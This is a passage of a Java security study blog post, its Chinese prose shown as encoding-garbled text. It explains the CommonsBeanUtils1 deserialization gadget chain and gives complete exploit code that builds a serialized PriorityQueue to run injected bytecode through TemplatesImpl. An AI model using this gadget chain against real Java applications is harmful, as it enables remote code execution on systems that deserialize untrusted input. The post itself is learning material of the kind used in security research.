class="hljs-comment">//addæœ€ç»ˆè°ƒç”¨comparator.compareï¼Œè¿™é‡Œçš„comparatorè¢«èµ‹å€¼ä¸ºbeanComparatorã€‚</span><br> queue.add(templates);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>new</code>äº†ä¸¤ä¸ªå®ä¾‹ï¼š<code>beanComparator</code>å’Œ<code>PriorityQueue</code>ï¼Œè¿™é‡Œå…ˆçœ‹ä¸‹å®ƒä¿©çš„æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br><span class="hljs-comment">//BeanComparatorçš„æ„é€ æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> String property;<br>    <span class="hljs-keyword">private</span> Comparator comparator;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯<code>new</code>äº†ä¸€ä¸ª<code>BeanComparator</code>ï¼Œç­‰ä¸‹è¦åˆ©ç”¨è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•å»è°ƒç”¨<code>(get)Property</code>æ–¹æ³•ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="/img/FindCompare.png" srcset="/img/loading.gif" lazyload alt="FindCompare"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator); <br></code></pre></td></tr></table></figure>

<p><code>new</code>äº†ä¸€ä¸ª<code>PriorityQueue</code>å®ä¾‹ï¼Œçœ‹ä¸‹å®ƒçš„æ„é€ å‡½æ•°:</p>
<p><img src="/img/priorityquee.png" srcset="/img/loading.gif" lazyload alt="priorityquee"></p>
<p>æ‰€ä»¥è¿™ä¸ªé˜Ÿåˆ—é‡Œå®¹çº³çš„åˆå§‹å…ƒç´ ä¸º2ï¼Œç„¶å<code>comparator</code>ä¸º<code>beanComparator</code>ï¼Œç„¶å<code>PriorityQueue</code> è¿™ä¸ªç±»çš„ <code>siftDownUsingComparator()</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>compare()</code>:</p>
<p><img src="/img/siftDownUsingComparator.png" srcset="/img/loading.gif" lazyload alt="siftDownUsingComparator"></p>
<p>æœ€ç»ˆå°±æˆäº†<code>BeanComparator.compare()</code></p>
<p>ç®€å•æ¢³ç†ä¸€ä¸‹ï¼š</p>
<p><code>queue.add(templates);</code> addæœ€ç»ˆè°ƒç”¨<code>comparator.compare</code>ï¼Œè¿™é‡Œçš„<code>comparator</code>è¢«èµ‹å€¼ä¸º<code>beanComparator</code>ï¼Œå³<code>beanComparator.compare</code></p>
<p>ç„¶åè¿™ä¸ª<code>compare</code>æ–¹æ³•å›å»è°ƒ<code>PropertyUtils.getProperty(o1, propeery)</code>ã€‚è¿™é‡Œ<code>property</code>çš„å€¼ä¸º<code>outputProperties</code>ã€‚<code>o1</code>éœ€è¦æ˜¯<code>TemplatesImpl</code>çš„å®ä¾‹å³ä¸Šé¢é‚£ä¸ª<code>templates</code>ã€‚</p>
<p> <code>queue.add(templates);  </code>è¿™é‡Œçš„<code>templates</code>å°±ç›¸å½“äºè¦è¢«æ¯”è¾ƒçš„<code>o1ï¼Œo2</code>äº†ã€‚</p>
<p>èµ°åˆ°<code>compare</code>å°±ç›¸å½“äºè¿™ä¸ªï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>)</span><br></code></pre></td></tr></table></figure>



<p>ç„¶åæ³¨æ„<code>add</code>çš„æ—¶å€™ä¹Ÿä¼šèµ°åˆ°æœ€ç»ˆçš„<code>compare</code>æ–¹æ³•ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©ä»–ååºåˆ—åŒ–æ—¶æ‰è§¦å‘ã€‚è¿™é‡Œæ€è·¯å°±è·Ÿå‰é¢é‚£å‡ æ¡æ”¹å€¼çš„é“¾å­ä¸€æ ·ï¼šå…ˆæ”¾ä¸ªæ²¡å•¥ç”¨çš„å˜é‡è¿›å»ï¼Œç„¶åé€šè¿‡åå°„ä¿®æ”¹å°±è¡Œã€‚</p>
<p>æœ€ç»ˆEXPï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1FinalEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç   </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(<span class="hljs-number">1</span>);  <br> queue.add(<span class="hljs-number">1</span>);  <br>  <br> <span class="hljs-comment">//å¯ä»¥çœ‹ä¸‹beanComparatorçš„æ„é€ æ–¹æ³•ï¼šè¿™é‡ŒæŠŠpropertyçš„å€¼è®¾ç½®ä¸ºoutputPropertiesï¼Œç›®çš„æ˜¯è°ƒç”¨getOutputProperties()è¿™ä¸ªæ–¹æ³•</span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br><br> setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);  <br> serialize(queue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span>  -&gt;<br>	<br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span> -&gt;<br>	<br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span> -&gt;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">templatesImpl</span>, <span class="hljs-params">outputProperties</span>)</span><br>	-&gt;<br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/cb1.png" srcset="/img/loading.gif" lazyload alt="cb1"></p>
<p>ç½‘ä¸Šçœ‹äº†å…¶å®ƒå¸ˆå‚…çš„å†™æ³•ï¼Œè¿˜èƒ½è¿™ä¹ˆå†™ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Clac.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        BeanComparator beanComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br><br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å°±å¤šäº†è¿™å‡ ä¸ªä¸œè¥¿ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br></code></pre></td></tr></table></figure>

<p>å…¶å®ç›®æ ‡è¿˜æ˜¯ä¿è¯<code>add</code>çš„æ—¶å€™ä¸å¼¹è®¡ç®—å™¨ï¼Œæ‰€ä»¥æ”¾äº†å‡çš„<code>queue</code>å’Œ<code>comparator</code>è¿›å»ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10457">å‚è€ƒæ–‡ç« </a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/119862728">CC7</a></p>
<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/">å‚è€ƒæ–‡ç« </a></p>
<p>ç­‰ç­‰ç­‰ã€‚ã€‚ã€‚</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#å­¦ä¹ ç¬”è®°</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®°</div>
      <div>http://example.com/2024/04/27/BUUCTF10/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>notbad3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´4æœˆ27æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/04/27/hnctf/" title="H&amp;NCTF2024_éƒ¨åˆ†web">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">H&amp;NCTF2024_éƒ¨åˆ†web</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/" title="æœ€è¿‘åšçš„å‡ é“JSé¢˜">
                        <span class="hidden-mobile">æœ€è¿‘åšçš„å‡ é“JSé¢˜</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
